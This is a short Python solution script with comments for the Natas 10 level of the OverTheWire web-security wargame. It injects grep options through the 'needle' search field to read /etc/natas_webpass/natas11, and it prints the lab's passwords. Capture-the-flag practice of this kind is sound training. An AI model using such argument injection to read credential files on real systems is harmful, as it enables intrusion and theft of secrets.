from bs4 import BeautifulSoup
import requests

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)
def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())
        
lvl_name = 'natas10'
url = f'http://{lvl_name}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE')
my_params = {'needle':'-v "fuck" /etc/natas_webpass/natas11 #', 'submit':'Search'} #This is where the magic happens.

res, soup = make()
writeResponse()

'''
Another puzzle near and dear to my heart. Requires one to read the grep manpage.
I chose the word "fuck" in the grep search, because the '-v' flag inverts the search results
(That is, returns all lines which DON'T match the search criteria), and I was fairly confident
that the password for natas11 was not "fuck", and would therefore be returned.

Username: natas11
Password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
 
'''